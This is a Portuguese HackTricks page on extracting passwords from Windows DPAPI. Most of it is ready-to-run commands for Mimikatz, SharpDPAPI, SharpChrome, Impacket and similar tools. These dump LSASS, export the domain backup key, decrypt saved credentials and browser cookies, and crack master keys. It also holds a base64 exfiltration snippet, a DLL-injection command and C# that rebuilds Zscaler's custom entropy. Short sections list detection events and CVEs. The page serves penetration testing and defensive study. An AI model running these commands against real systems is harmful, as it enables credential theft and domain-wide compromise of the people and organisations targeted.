# DPAPI - Extracting Passwords

{{#include ../../banners/hacktricks-training.md}}



## O que é DPAPI

A Data Protection API (DPAPI) é utilizada principalmente no sistema operacional Windows para a **criptografia simétrica de chaves privadas assimétricas**, usando segredos do usuário ou do sistema como uma importante fonte de entropia. Essa abordagem simplifica a criptografia para os desenvolvedores, permitindo que criptografem dados usando uma chave derivada dos segredos de logon do usuário ou, no caso da criptografia do sistema, dos segredos de autenticação de domínio do sistema, eliminando a necessidade de os desenvolvedores gerenciarem a proteção da própria chave de criptografia.

A forma mais comum de usar a DPAPI é por meio das funções **`CryptProtectData` e `CryptUnprotectData`**, que permitem que os aplicativos criptografem e descriptografem dados usando o contexto de segurança do processo atualmente conectado. Por padrão, os dados só podem ser descriptografados pelo mesmo usuário ou contexto do sistema que os criptografou.<sup>[[2]](#references)[[3]](#references)</sup>

Essas funções também aceitam um **parâmetro de entropia** opcional, usado durante a criptografia e a descriptografia. Dados protegidos com entropia opcional exigem esse mesmo valor de entropia para serem descriptografados.<sup>[[2]](#references)[[6]](#references)</sup>

### Geração da chave dos usuários

A DPAPI deriva um valor específico do usuário (frequentemente chamado de **pré-chave**) a partir das credenciais do usuário. A derivação exata depende da conta e da versão do sistema operacional. Por exemplo, o Impacket tenta um caminho HMAC-SHA1 baseado no digest SHA-1 da senha em UTF-16LE, outro baseado no hash MD4/NT da senha e um caminho derivado por PBKDF2-SHA256 para Protected Users. É por isso que ferramentas offline geralmente conseguem derivar o material necessário a partir da senha em texto simples ou de um hash NT disponível.<sup>[[2]](#references)[[10]](#references)</sup>

Isso é especialmente interessante porque, se um atacante conseguir obter o hash da senha do usuário, ele poderá:

- **Descriptografar quaisquer dados que tenham sido criptografados usando DPAPI** com a chave desse usuário, sem precisar entrar em contato com nenhuma API
- Tentar **quebrar a senha** offline, tentando gerar a chave DPAPI válida

A DPAPI mantém uma ou mais **master keys** para cada usuário, em vez de criar uma nova master key para cada blob protegido. Cada master key tem um **GUID** (Globally Unique Identifier), e um blob criptografado registra qual master key o protege.<sup>[[2]](#references)</sup>

As master keys são armazenadas no diretório **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, onde `{SID}` é o Security Identifier do usuário. O arquivo da master key contém material protegido pela **pré-chave** do usuário e, para usuários de domínio, material de recuperação protegido por uma **domain backup key**.<sup>[[2]](#references)</sup>

Observe que a **domain key usada para criptografar a master key está nos controladores de domínio e nunca muda**. Portanto, se um atacante tiver acesso ao controlador de domínio, poderá recuperar a domain backup key e descriptografar as master keys de todos os usuários do domínio.<sup>[[2]](#references)</sup>

Os blobs criptografados contêm o **GUID da master key** usada para criptografar os dados em seus cabeçalhos.

> [!TIP]
> Blobs criptografados pela DPAPI começam com **`01 00 00 00`**

Encontrar master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Isto é o que várias Master Keys de um usuário terão esta aparência:

![O que é DPAPI - Geração de chaves de usuário: isto é o que várias Master Keys de um usuário terão esta aparência](<../../images/image (1121).png>)

### Geração de chaves da máquina/do sistema

Esta é a chave usada pela máquina para criptografar dados. Ela é baseada no **segredo LSA DPAPI_SYSTEM**, que é uma chave especial que somente o usuário SYSTEM pode acessar. Essa chave é usada para criptografar dados que precisam estar acessíveis ao próprio sistema, como credenciais no nível da máquina ou secrets de todo o sistema.<sup>[[2]](#references)</sup>

Observe que essas chaves **não têm um backup de domínio**, portanto só podem ser acessadas localmente:

- O **Mimikatz** pode acessá-la fazendo dump dos secrets LSA usando o comando: `mimikatz lsadump::secrets`
- O secret é armazenado dentro do registro, portanto um administrador poderia **modificar as permissões DACL para acessá-lo**. O caminho do registro é: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- A extração offline dos registry hives também é possível. Por exemplo, como administrador no alvo, salve os hives e exfiltre-os:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Em seguida, na sua máquina de análise, recupere o segredo LSA DPAPI_SYSTEM dos hives e use-o para descriptografar blobs no escopo da máquina (senhas de tarefas agendadas, credenciais de serviços, perfis de Wi-Fi etc.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Dados protegidos pelo DPAPI

Entre os dados pessoais protegidos pelo DPAPI estão:

- Credenciais do Windows
- Senhas e dados de preenchimento automático do Internet Explorer e do Google Chrome
- Senhas de contas de e-mail e FTP interno para aplicações como Outlook e Windows Mail
- Senhas de pastas compartilhadas, recursos, redes sem fio e do Windows Vault, incluindo chaves de criptografia
- Senhas de conexões de remote desktop, .NET Passport e chaves privadas para diversos fins de criptografia e autenticação
- Senhas de rede gerenciadas pelo Credential Manager e dados pessoais em aplicações que usam CryptProtectData, como Skype, MSN messenger e outras
- Blobs criptografados dentro do registro
- ...

Os dados protegidos pelo sistema incluem:
- Senhas de Wi-Fi
- Senhas de tarefas agendadas
- ...

### Opções de extração de master key

- Se o usuário tiver privilégios de domain admin, ele poderá acessar a **chave de backup do domínio** para descriptografar todas as master keys dos usuários no domínio:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Com privilégios de administrador local, é possível **acessar a memória do LSASS** para extrair as chaves mestras do DPAPI de todos os usuários conectados e a chave do SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Se o usuário tiver privilégios de administrador local, ele poderá acessar o **segredo DPAPI_SYSTEM da LSA** para descriptografar as chaves mestras da máquina:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Se a senha ou o hash NTLM do usuário for conhecido, você poderá **descriptografar diretamente as chaves mestras do usuário**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Se você estiver dentro de uma sessão como o usuário, é possível solicitar ao DC a **chave de backup para descriptografar as chaves mestras usando RPC**. Se você for administrador local e o usuário estiver conectado, poderá **roubar o token de sessão dele** para isso:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Listar o Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Acessar dados criptografados pelo DPAPI

### Encontrar dados criptografados pelo DPAPI

Os **arquivos protegidos** de usuários comuns estão em:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Verifique também substituindo `\Roaming\` por `\Local\` nos caminhos acima.

Exemplos de enumeração:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) pode encontrar blobs criptografados pelo DPAPI no sistema de arquivos, no registro e em blobs B64:<sup>[[12]](#references)</sup>
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Observe que [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (do mesmo repositório) pode ser usado para descriptografar dados sensíveis usando DPAPI, como cookies.<sup>[[12]](#references)</sup>

#### Receitas rápidas para Chromium/Edge/Electron (SharpChrome)

- Usuário atual, descriptografia interativa de logins/cookies salvos (funciona mesmo com cookies vinculados ao aplicativo do Chrome 127+, pois a chave adicional é resolvida a partir do Credential Manager do usuário ao executar no contexto do usuário):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Análise offline quando você só tem arquivos. Primeiro extraia a chave de estado AES do "Local State" do perfil e depois use-a para descriptografar o banco de dados de cookies:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triagem em todo o domínio/remota quando você tem a chave de backup de domínio do DPAPI (PVK) e admin no host de destino:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Se você tiver a prekey/credkey DPAPI de um usuário (do LSASS), poderá ignorar o password cracking e descriptografar diretamente os dados do perfil:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Notas
- Builds mais recentes do Chrome/Edge podem armazenar determinados cookies usando criptografia "App-Bound". A descriptografia offline desses cookies específicos não é possível sem a chave app-bound adicional; execute o SharpChrome no contexto do usuário-alvo para recuperá-la automaticamente. Consulte a publicação do blog de segurança do Chrome referenciada abaixo.<sup>[[5]](#references)</sup>

### Chaves de acesso e dados

- **Use SharpDPAPI** para obter credenciais de arquivos criptografados com DPAPI da sessão atual:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Obter informações das credenciais** como os dados criptografados e o guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Decrypt a masterkey de um usuário solicitando a **domain backup key** usando RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
A ferramenta **SharpDPAPI** também oferece suporte a estes argumentos para descriptografar a masterkey (observe como é possível usar `/rpc` para obter a chave de backup do domínio, `/password` para usar uma senha em texto simples ou `/pvk` para especificar um arquivo de chave privada DPAPI do domínio...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Descriptografar dados usando uma masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
A ferramenta **SharpDPAPI** também aceita estes argumentos para a descriptografia de `credentials|vaults|rdg|keepass|triage|blob|ps` (observe como é possível usar `/rpc` para obter a chave de backup do domínio, `/password` para usar uma senha em texto simples, `/pvk` para especificar um arquivo de chave privada DPAPI do domínio e `/unprotect` para usar a sessão do usuário atual...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Usando uma prekey/credkey do DPAPI diretamente (sem precisar da senha)

Se você puder fazer dump do LSASS, o Mimikatz geralmente expõe uma chave DPAPI por logon que pode ser usada para descriptografar as masterkeys do usuário sem conhecer a senha em texto claro. Passe esse valor diretamente para a ferramenta:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Descriptografar alguns dados usando a **sessão do usuário atual**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Decryption offline com Impacket dpapi.py

Se você tiver o SID e a password do usuário vítima (ou o NT hash), poderá descriptografar as masterkeys do DPAPI e os blobs do Credential Manager inteiramente offline usando o dpapi.py do Impacket.<sup>[[10]](#references)[[11]](#references)</sup>

- Identifique os artefatos no disco:
- Blob(s) do Credential Manager: %APPDATA%\Microsoft\Credentials\<hex>
- Masterkey correspondente: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Se as ferramentas de transferência de arquivos estiverem instáveis, faça base64 dos arquivos no host e copie a saída:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Descriptografe a masterkey com o SID e a senha/hash do usuário:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Use a masterkey descriptografada para descriptografar o credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Este workflow frequentemente recupera credenciais de domínio salvas por aplicativos que usam o Windows Credential Manager, incluindo contas administrativas (por exemplo, `*_adm`).

---

### Tratamento de Entropy Opcional ("Third-party entropy")

Alguns aplicativos passam um valor adicional de **entropy** para `CryptProtectData`. Sem esse valor, o blob não pode ser descriptografado, mesmo que a masterkey correta seja conhecida. Obter a entropy é, portanto, essencial ao visar credenciais protegidas dessa forma (por exemplo, Microsoft Outlook e alguns clientes VPN).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) é uma DLL em modo de usuário que intercepta as funções DPAPI dentro do processo-alvo e registra de forma transparente qualquer entropy opcional fornecida. Executar o EntropyCapture no modo **DLL-injection** contra processos como `outlook.exe` ou `vpnclient.exe` produzirá um arquivo mapeando cada buffer de entropy ao processo chamador e ao blob. A entropy capturada pode posteriormente ser fornecida ao **SharpDPAPI** (`/entropy:`) ou ao **Mimikatz** (`/entropy:<file>`) para descriptografar os dados.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking de masterkeys offline (Hashcat & DPAPISnoop)

A Microsoft introduziu um formato de masterkey de **context 3** a partir do Windows 10 v1607 (2016). O `hashcat` v6.2.6 (dezembro de 2023) adicionou os hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) e **22102** (context 3), permitindo o cracking acelerado por GPU de senhas de usuários diretamente do arquivo de masterkey. Portanto, os Attackers podem realizar ataques de word-list ou brute-force sem interagir com o sistema-alvo.<sup>[[7]](#references)</sup>

O `DPAPISnoop` (2024) automatiza o processo:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
A ferramenta também pode analisar blobs de Credential e Vault, descriptografá-los com chaves quebradas e exportar senhas em texto claro.<sup>[[8]](#references)</sup>


### Acessar dados de outra máquina

No **SharpDPAPI e SharpChrome**, você pode indicar a opção **`/server:HOST`** para acessar os dados de uma máquina remota. Naturalmente, você precisa conseguir acessar essa máquina e, no exemplo a seguir, supõe-se que a **chave de backup de criptografia do domínio seja conhecida**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Outras ferramentas

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) é uma ferramenta que automatiza a extração de todos os usuários e computadores do diretório LDAP e a extração da backup key do domain controller por meio de RPC. O script então resolverá o endereço IP de todos os computadores e executará um smbclient em todos eles para recuperar todos os blobs DPAPI de todos os usuários e descriptografar tudo com a domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Com a lista de computadores extraída do LDAP, você pode encontrar todas as sub-redes, mesmo que não soubesse da existência delas!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) pode fazer dump automático de secrets protegidos pelo DPAPI. A versão 2.x introduziu:<sup>[[9]](#references)</sup>

* Coleta paralela de blobs de centenas de hosts
* Parsing de masterkeys de **context 3** e integração automática com cracking do Hashcat
* Suporte a cookies criptografados "App-Bound" do Chrome (veja a próxima seção)
* Um novo modo **`--snapshot`** para consultar endpoints repetidamente e comparar blobs recém-criados

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) é um parser em C# para arquivos de masterkey/credential/vault que pode gerar formatos do Hashcat/JtR e, opcionalmente, executar o cracking automaticamente. Ele oferece suporte completo aos formatos de masterkey de máquina e usuário até o Windows 11 24H1.<sup>[[8]](#references)</sup>


## Detecções comuns

- Acesso a arquivos em `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` e outros diretórios relacionados ao DPAPI.
- Especialmente a partir de um network share como **C$** ou **ADMIN$**.
- Uso do **Mimikatz**, **SharpDPAPI** ou de ferramentas semelhantes para acessar a memória do LSASS ou fazer dump de masterkeys.
- Evento **4662**: *Uma operação foi executada em um objeto* – pode ser correlacionado com o acesso ao objeto **`BCKUPKEY`**.
- Evento **4673/4674** quando um processo solicita *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilidades e mudanças no ecossistema de 2023 a 2025

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (novembro de 2023). Um atacante com acesso à rede poderia induzir um membro do domínio a recuperar uma malicious DPAPI backup key, permitindo a descriptografia das masterkeys dos usuários. Corrigido na atualização cumulativa de novembro de 2023 – os administradores devem garantir que os DCs e as workstations estejam totalmente atualizados.<sup>[[4]](#references)</sup>
* **Criptografia de cookies “App-Bound” do Chrome 127** (julho de 2024) substituiu a proteção legada baseada apenas em DPAPI por uma chave adicional armazenada no **Credential Manager** do usuário. A descriptografia offline dos cookies agora exige tanto a masterkey do DPAPI quanto a **chave app-bound encapsulada em GCM**. SharpChrome v2.3 e DonPAPI 2.x conseguem recuperar a chave adicional quando executados no contexto do usuário.<sup>[[5]](#references)</sup>


### Estudo de caso: Zscaler Client Connector – Entropia personalizada derivada do SID

O Zscaler Client Connector armazena vários arquivos de configuração em `C:\ProgramData\Zscaler` (por exemplo, `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Cada arquivo é criptografado com **DPAPI (Machine scope)**, mas o fornecedor fornece uma **custom entropy** que é *calculada em runtime*, em vez de ser armazenada no disco.<sup>[[1]](#references)</sup>

A entropia é reconstruída a partir de dois elementos:

1. Um secret fixo incorporado ao `ZSACredentialProvider.dll`.
2. O **SID** da conta do Windows à qual a configuração pertence.

O algoritmo implementado pela DLL é equivalente a:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Como o segredo está incorporado em uma DLL que pode ser lida do disco, **qualquer atacante local com direitos SYSTEM pode regenerar a entropia para qualquer SID** e descriptografar os blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
A descriptografia produz a configuração JSON completa, incluindo cada **device posture check** e seu valor esperado – informações muito valiosas ao tentar bypasses no cliente.

> DICA: os outros artefatos criptografados (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) são protegidos com DPAPI **sem** entropia (`16` bytes zero). Portanto, podem ser descriptografados diretamente com `ProtectedData.Unprotect` assim que os privilégios de SYSTEM forem obtidos.

## References

- [1] [Synacktiv – Você deve confiar no seu zero trust? Bypass dos posture checks do Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [Segredos DPAPI. Análise de segurança e recuperação de dados no DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Lendo segredos criptografados com DPAPI usando Mimikatz e C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Vulnerabilidade de spoofing do Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Melhorando a segurança dos cookies do Chrome no Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: extração simples de entropia opcional do DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Notas de versão do hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – repositório do GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – página do projeto no PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: abuso de ACLs do AD, cracking de Argon2 do KeePassXC e descriptografia de DPAPI até administrador do DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – uso e opções](https://github.com/GhostPack/SharpDPAPI)
{{#include ../../banners/hacktricks-training.md}}
